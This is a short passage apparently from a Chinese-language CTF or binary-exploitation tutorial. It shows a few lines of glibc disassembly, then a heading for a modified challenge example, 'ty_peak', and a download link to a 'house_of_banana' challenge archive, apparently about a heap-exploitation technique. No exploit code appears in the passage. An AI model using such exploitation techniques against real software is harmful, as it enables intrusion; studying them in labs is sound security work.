   581ef:	48 8b 0d 7a 2c 19 00 	mov    0x192c7a(%rip),%rcx        # 1eae70 <h_errlist@@GLIBC_2.2.5+0xd50>
   581f6:	f7 d8                	neg    %eax
   581f8:	64 89 01             	mov    %eax,%fs:(%rcx)
   581fb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   581ff:	c3                   	retq   
```


### 样例:ty_peak(修改)

  [点击下载题目资源](house_of_banana.tar.gz)
